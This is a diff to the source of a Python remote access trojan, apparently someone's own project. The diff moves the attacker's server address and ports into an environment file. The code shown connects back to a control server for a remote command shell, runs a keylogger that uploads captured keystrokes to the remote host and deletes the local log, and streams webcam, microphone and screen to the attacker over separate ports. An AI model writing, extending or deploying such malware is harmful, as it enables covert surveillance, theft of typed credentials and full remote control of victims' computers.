@@ -1,4 +1,3 @@
-# Import necessary Python modules
 import socket  # For network communication
 import time  # For adding delays
 import subprocess  # For running shell commands
@@ -8,12 +7,12 @@ from pynput.keyboard import Listener  # For capturing keyboard events
 import re
 import pyaudio
 import threading
-import wave
 import pickle
 import cv2
 import struct
 from PIL import ImageGrab
 import numpy as np
+from dotenv import load_dotenv
 
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
@@ -35,7 +34,7 @@ def connection():
     while True:
         time.sleep(5)  # Wait for 10 seconds before reconnecting (for resilience)
         try:
-            # Connect to a remote host with IP '192.168.1.39' and port 5555
+            # Connect to a remote host with IP '192.168.1.43' and port 5555
             s.connect((SERVER_IP, CONTROL_PORT))
             # Once connected, enter the shell() function for command execution
             shell()
@@ -91,8 +90,6 @@ def start_keylogging(filename):
     keylogger_listener.start()                              # Start the listener to capture key events
     print(f'[+] Keylogging started: {filename}')
 
-    # this comment section is for uploading the keylog file periodically (not yet implemented)
-
 
 def stop_keylogging():
     global keylogger_listener, keylogging_filename              # Use the global variable to stop the listener
@@ -102,7 +99,6 @@ def stop_keylogging():
 
     upload_file(filename)                                       # Upload the keylog file to the remote host
     os.remove(filename)                                         # Remove the keylog file from the local system
-    print(f'[+] Keylogging stopped and {filename} uploaded.')
     keylogging_filename = None
 
 
@@ -215,7 +211,7 @@ def delete_hacker_user():
     except Exception as e:
         reliable_send(f"[-] Failed to delete user: {str(e)}")
 
-# --- Streaming Functions (to be run in threads) ---
+
 def start_video_stream():
     global video_stream_active
     video_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -335,6 +331,7 @@ def start_screen_stream():
 
     screen_socket.close()
 
+
 def shell():
     global keylogger_status, keylogging_filename, livekeylogging_status, video_stream_active, audio_stream_active, screen_stream_active
     print("you have been hacked, be careful!")
@@ -436,11 +433,14 @@ def shell():
             # Send the command execution result back to the remote host
             reliable_send(result)
 
-SERVER_IP = '192.168.1.164'
-CONTROL_PORT = 5555
-VIDEO_PORT = 9999
-AUDIO_PORT = 9998
-SCREEN_PORT = 9997
+#downlaod dotenv file for initialize program configuration
+load_dotenv()
+
+SERVER_IP = str(os.getenv("HOST_IP"))
+CONTROL_PORT = int(os.getenv("CONTROL_PORT"))
+VIDEO_PORT = int(os.getenv("VIDEO_PORT"))
+AUDIO_PORT = int(os.getenv("AUDIO_PORT"))
+SCREEN_PORT = int(os.getenv("SCREEN_PORT"))
 
 video_stream_active, audio_stream_active, screen_stream_active = False, False, False
 
